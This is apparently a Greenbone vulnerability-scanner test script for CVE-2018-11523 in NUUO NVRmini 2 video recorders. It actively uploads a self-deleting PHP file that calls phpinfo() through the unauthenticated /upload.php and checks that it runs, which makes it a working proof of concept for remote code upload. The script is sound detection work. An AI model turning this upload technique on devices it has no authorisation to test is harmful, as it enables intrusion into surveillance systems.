# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:nuuo:nuuo";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141124");
  script_version("2025-02-27T08:17:42+0000");
  script_tag(name:"last_modification", value:"2025-02-27 08:17:42 +0000 (Thu, 27 Feb 2025)");
  script_tag(name:"creation_date", value:"2018-05-30 13:34:16 +0700 (Wed, 30 May 2018)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-06-29 18:04:00 +0000 (Fri, 29 Jun 2018)");

  script_cve_id("CVE-2018-11523");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("NUUO NVRmini 2 < 3.9.1 File Upload Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_nuuo_devices_http_detect.nasl");
  script_mandatory_keys("nuuo/device/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"NUUO NVRmini 2 devices are prone to a file upload
  vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to upload a PHP file and checks if phpinfo() can be
  executed.");

  script_tag(name:"insight", value:"upload.php on NUUO NVRmini 2 devices allows arbitrary file
  upload, such as the upload of .php files.");

  script_tag(name:"solution", value:"Update to version 3.9.1 or later.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/44794/");
  script_xref(name:"URL", value:"https://www.nuuo.com/NewsDetail.php?id=0425");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

vt_strings = get_vt_strings();
file = vt_strings["default_rand"] + '.php';

bound = '---------------------------' + vt_strings["default"];

data = '--' + bound + '\r\n' +
       'Content-Disposition: form-data; name="userfile"; filename="' + file + '"\r\n\r\n' +
       '<?php phpinfo(); unlink(__FILE__); ?>\r\n' +
       '--' + bound + '--\r\n';

req = http_post_put_req(port: port, url: "/upload.php", data: data,
                        add_headers: make_array("Content-Type", "multipart/form-data; boundary=" + bound));
res = http_keepalive_send_recv(port: port, data: req);

url = "/" + file;

if (http_vuln_check(port: port, url: url, pattern: "PHP Version", check_header: TRUE, extra_check: "PHP API")) {
  report = "It was possible to upload a PHP file and execute phpinfo().";
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
